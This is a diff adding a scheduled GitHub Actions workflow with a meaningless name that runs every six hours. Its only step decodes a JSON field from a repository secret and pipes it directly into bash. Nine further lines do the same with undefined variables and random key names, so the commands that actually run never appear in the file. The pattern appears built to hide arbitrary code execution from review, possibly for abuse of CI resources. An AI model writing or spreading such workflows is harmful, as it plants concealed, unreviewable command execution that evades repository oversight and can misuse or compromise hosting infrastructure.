@@ -1,0 +1,27 @@
+name: chengyasheng7618
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengyasheng7618
+        env:
+          oc88: ${{ secrets.oc88 }}
+        run: |
+          echo $oc88 | jq -r .s13880 | /bin/bash
+          echo $yfu56 | jq -r .bbgt83517 | /bin/bash
+          echo $bshiq8373 | jq -r .i3138 | /bin/bash
+          echo $jy00 | jq -r .zuamo91336 | /bin/bash
+          echo $pv5332 | jq -r .pn356 | /bin/bash
+          echo $isr71740 | jq -r .mammb91735 | /bin/bash
+          echo $gzjlh88 | jq -r .iyl1685 | /bin/bash
+          echo $nw342 | jq -r .l0 | /bin/bash
+          echo $u818 | jq -r .oxo32365 | /bin/bash
+          echo $ych50 | jq -r .hu00346 | /bin/bash
+
